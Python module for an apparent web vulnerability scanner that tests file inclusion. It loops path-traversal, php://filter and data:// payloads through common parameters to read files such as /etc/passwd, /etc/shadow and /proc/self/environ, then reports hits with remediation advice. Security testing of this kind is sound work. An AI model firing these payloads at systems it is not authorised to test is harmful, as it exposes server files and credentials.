import re
from modules.base import BaseModule


class LfiModule(BaseModule):
    NAME = "lfi"
    DESCRIPTION = "LFI/RFI testing - path traversal, php:// wrappers"

    LFI_PAYLOADS = [
        "../../../../etc/passwd",
        "../../../etc/passwd",
        "../../../../windows/system32/drivers/etc/hosts",
        "../../../../proc/self/environ",
        "../../../../var/log/apache2/access.log",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=string.rot13/resource=index.php",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
        "/etc/passwd",
        "/etc/shadow",
    ]

    SUCCESS_PATTERNS = [
        r"root:.*:0:0:",
        r"daemon:",
        r"\[PHP\]",
        r"DOCUMENT_ROOT",
        r"<?php",
    ]

    PARAMS = ["file", "page", "path", "include", "load", "template",
              "view", "doc", "document", "dir", "show", "read"]

    def run(self):
        self.log.info("[lfi] Testing for file inclusion vulnerabilities")
        for param in self.PARAMS:
            for payload in self.LFI_PAYLOADS:
                resp = self.get(self.target, params={param: payload})
                if resp and any(re.search(p, resp.text) for p in self.SUCCESS_PATTERNS):
                    self.add_finding(
                        severity="CRITICAL",
                        title="Local File Inclusion",
                        url=self.target,
                        detail=f"Parameter '{param}' discloses server files.",
                        payload=payload,
                        evidence=resp.text[:400],
                        remediation=(
                            "Never pass user input to filesystem functions. "
                            "Use an allowlist of permitted files."
                        ),
                    )
                    return
